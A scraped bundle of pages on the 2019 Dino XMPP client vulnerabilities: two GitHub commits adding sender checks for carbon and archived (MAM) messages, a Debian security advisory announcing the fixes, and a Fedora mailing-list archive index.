
Maximum font size

Page dependencies

Inline

Reference

Citation links

 Go to reference section

Go to linked document

![](//analytics.ietf.org/piwik.php?idsite=7)



=== Content from github.com_44e79fc6_20250121_025943.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix check of source of a carbons message

[Browse files](/dino/dino/tree/e84f2c49567e86d2a261ea264d65c4adc549c930)
Browse the repository at this point in the history

* Loading branch information

[![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

[mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
committed
Sep 10, 2019

1 parent
[bd7fde9](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)

commit e84f2c4

Showing
**1 changed file**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[xmpp-vala/src/module/xep/0280\_message\_carbons.vala](#diff-acfb817f08aac774de8a6f8296cd4a9471d4c30c32630b45ac4233b5fe899153 "xmpp-vala/src/module/xep/0280_message_carbons.vala")

Show comments

[View file](/dino/dino/blob/e84f2c49567e86d2a261ea264d65c4adc549c930/xmpp-vala/src/module/xep/0280_message_carbons.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -52,9 +52,9 @@ public class ReceivedPipelineListener : StanzaListener<MessageStanza> { |
|  |  | StanzaNode? forwarded\_node = carbons\_node.get\_subnode("forwarded", "urn:xmpp:forward:0"); |
|  |  | if (forwarded\_node != null) { |
|  |  | StanzaNode? message\_node = forwarded\_node.get\_subnode("message", Xmpp.NS\_URI); |
|  |  | string? from\_attribute = message\_node.get\_attribute("from", Xmpp.NS\_URI); |
|  |  | // Any forwarded copies received by a Carbons-enabled client MUST be from that user's bare JID; any copies that do not meet this requirement MUST be ignored. |
|  |  | if (from\_attribute != null && from\_attribute == stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid.to\_string()) { |
|  |  | if (!message.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alleged carbon message from %s, ignoring", message.from.to\_string()); |
|  |  | return true; |
|  |  | } |
|  |  | if (received\_node != null) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e84f2c4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_8b56bda2_20250121_005013.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

![](/shared/images/nst-icons.svg#search)

# [SECURITY] [DSA 4524-1] dino-im security update

---

*From*: Moritz Muehlenhoff <jmm () debian org>

*Date*: Mon, 16 Sep 2019 19:46:42 +0000

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4524-1                   security () debian org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
September 16, 2019                    <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : dino-im
CVE ID         : CVE-2019-16235 CVE-2019-16236 CVE-2019-16237

Multiple vulnerabilities have been discovered in the Dino XMPP client,
which could allow spoofing message, manipulation of a user's roster
(contact list) and unauthorised sending of message carbons.

For the stable distribution (buster), these problems have been fixed in
version 0.0.git20181129-1+deb10u1.

We recommend that you upgrade your dino-im packages.

For the detailed security status of dino-im please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/dino-im>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce () lists debian org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAl1/5m4ACgkQEMKTtsN8
TjZoew//VzHzRJugquWiQMLE3U9FZ5gxST5PHZELo2Dra/dG/ZwCDEmN2D5LJQdw
y/mS5E8X7jxiDIBQkbbXqPlZZ2vMZYw/WM0uu8X1OyzVM2yk/TBaq2bhi81J4SCy
Nd87xICSAZFkfRAE8E97+PSvT8nPJ3BkqcFm59NrShPyS4rhc091E2pkYlGbOwCS
CTdenMWkJXlSZBwmg2zUoLWp7asGlM35OggZEVoexim+3hGO6mm15sejqH4TzuRa
UdwbsO/TtQhBsj/BDmnPfXwkjkwoM40xr2Yko+HD3QzZCQ4oE2SQ37weu9qB2UU3
qBLB0wsvD5JMwq4mEZYsB//WAMPt875WujEl85Z19ri0TEWUHSKCvtcUdlnAigiQ
YL6GkwwVRN3+mHKUvs4u4+kvuO2Uyr0aPjki0nKMTJp+aLPhug3xgGWuyGlX0BIT
0B5XW+BMEj/N4ynVN+1Z5EkfuzkrArwTs3cZlCJi5ILXO8iNBPhIbRFJxUUkbUv2
0bScafddSNVk2EyLPYo1vvNdMiq5hKr12jvgfX+Jq++XpJX5KPMHEHWZ03HqHfjF
avneQfQYGsyhyq1MmCNxzY/gLZ3DKh7yv+Tg0BbeC/UDTDjs41IgVquRlickHbI6
5D6JZMQCJDk9ShOwSPKF60DkER7E/Tga/r/ryjw1K3ftwfG30nw=
=93xm
-----END PGP SIGNATURE-----

```

---

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](32)

### Current thread:

* **[SECURITY] [DSA 4524-1] dino-im security update** *Moritz Muehlenhoff (Sep 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_9cc6a7f2_20250121_025947.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2F307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2F307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix check of source of MAM message

[Browse files](/dino/dino/tree/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)
Browse the repository at this point in the history

* Loading branch information

[![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

[fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
committed
Sep 10, 2019

1 parent
[e84f2c4](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

commit 307f16c

Showing
**1 changed file**
with
**6 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

7 changes: 6 additions & 1 deletion

7
[xmpp-vala/src/module/xep/0313\_message\_archive\_management.vala](#diff-0f875e32135d376cebbfdb5ca774722dd82fc8ca7c3de3bbf43cec41d54a2dd4 "xmpp-vala/src/module/xep/0313_message_archive_management.vala")

Show comments

[View file](/dino/dino/blob/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363/xmpp-vala/src/module/xep/0313_message_archive_management.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -94,11 +94,16 @@ public class ReceivedPipelineListener : StanzaListener<MessageStanza> { |
|  |  | public override string[] after\_actions { get { return after\_actions\_const; } } |
|  |  |  |
|  |  | public override async bool run(XmppStream stream, MessageStanza message) { |
|  |  | // if (message.from != stream.remote\_name) return; |
|  |  | if (stream.get\_flag(Flag.IDENTITY) == null) return false; |
|  |  |  |
|  |  | StanzaNode? message\_node = message.stanza.get\_deep\_subnode(NS\_VER(stream) + ":result", "urn:xmpp:forward:0:forwarded", Xmpp.NS\_URI + ":message"); |
|  |  | if (message\_node != null) { |
|  |  | // MAM messages must come from our server // TODO or a MUC server |
|  |  | if (!message.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alledged MAM message from %s, ignoring", message.from.to\_string()); |
|  |  | return true; |
|  |  | } |
|  |  |  |
|  |  | StanzaNode? forward\_node = message.stanza.get\_deep\_subnode(NS\_VER(stream) + ":result", "urn:xmpp:forward:0:forwarded", DelayedDelivery.NS\_URI + ":delay"); |
|  |  | DateTime? datetime = DelayedDelivery.Module.get\_time\_for\_node(forward\_node); |
|  |  | message.add\_flag(new MessageFlag(datetime)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `307f16c`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2F307f16cc86dd2b95aa02ab8a85110e4a2d5e7363) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_6c8f8986_20250121_005012.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
